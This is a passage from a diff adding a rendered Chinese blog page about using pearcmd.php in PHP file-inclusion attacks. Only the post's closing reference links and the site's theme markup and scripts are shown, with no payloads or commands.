+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://y4tacker.github.io/2022/06/19/year/2022/6/%E5%85%B3%E4%BA%8Epearcmd%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/#download">https://y4tacker.github.io/2022/06/19/year/2022/6/%E5%85%B3%E4%BA%8Epearcmd%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/#download</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div></div>
+      <div>https://leekosss.github.io/2023/08/24/pearcmd.php文件包含妙用/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>leekos</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年8月24日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2023年7月24日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/08/24/phpfilter%E7%BB%95%E8%BF%87%E6%AD%BB%E4%BA%A1exit/" title="">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/08/24/NodeJS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93&amp;ctfshow_nodejs/" title="">
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"e5J90iDkXMWhU5UNlEX1I2hO-gzGzoHsz","appKey":"esLROw9j3xLk2nV4tQkKaih1","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      赣ICP备2022008842号-2
+    </a>
+  </span>
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
